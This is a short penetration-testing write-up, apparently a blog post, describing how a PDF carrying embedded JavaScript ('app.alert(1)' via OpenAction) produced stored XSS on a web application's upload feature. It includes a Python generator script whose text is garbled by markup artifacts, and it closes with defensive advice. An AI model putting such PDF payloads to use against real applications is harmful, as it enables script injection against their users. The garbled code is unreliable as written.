Hello everyone, I want to share an interesting discovery from my latest penetration testing task. While exploring a web application, I stumbled upon a file upload feature for a business application.

Naturally, I attempted to upload various file types and tried to exploit potential vulnerabilities to upload a PHP file, given that the backend was written in PHP. Unfortunately, my initial attempts were unsuccessful.

However, I was able to successfully upload a PDF file. Recognizing this, I conducted some online research and found that you could inject JavaScript code into PDF files.

So I needed to have a injection inside a PDF file and if the website didn’t do the necessary checks we have ourselves a stored XSS vulnerability. Searching online I couldn’t find a simple XSS PDF. So I decided to implement a Python script. This Python script embedded a JavaScript code into the PDF, in this case, `app.alert(1)`.

Here’s a snippet of the Python code:

#<https://github.com/kaanatmacaa>  
==import== ==sys====if== ==sys.version_info[====0====] <== ==3====:==    ==raise== ==SystemExit(===="Use Python 3 (or higher) only"====)  
====import== ==io====import== ==bz2====import== ==base64====def== ==create_malpdf1====(====filename====):==    ==with== ==open====(filename,== =="w"====)== ==as== ==file:  
        file.write(===='''%PDF-1.7  
        1 0 obj  
        <</Pages 1 0 R /OpenAction 2 0 R>>  
        2 0 obj  
        <</S /JavaScript /JS (app.alert(1))  
        >> trailer <</Root 1 0 R>>'''====)  
  
====if== ==__name__ ==== =="__main__"====:==    ==print====(===="Creating PDF files.."====)  
    create_malpdf1(===="test.pdf"====)==    ==print====(===="Done!"====)==

_I’m currently developing a more comprehensive tool, which will be available on my GitHub account:_ [_https://github.com/kaanatmacaa_](https://github.com/kaanatmacaa)_._

After creating the PDF file, I uploaded it to the web application, and BOOM… Stored XSS.

In conclusion, users and organizations generally do not anticipate malicious scripts within PDF documents. Developers should implement robust security checks for PDF files within their applications. Furthermore, organizations utilizing third-party PDF file readers should prioritize keeping these components up to date.
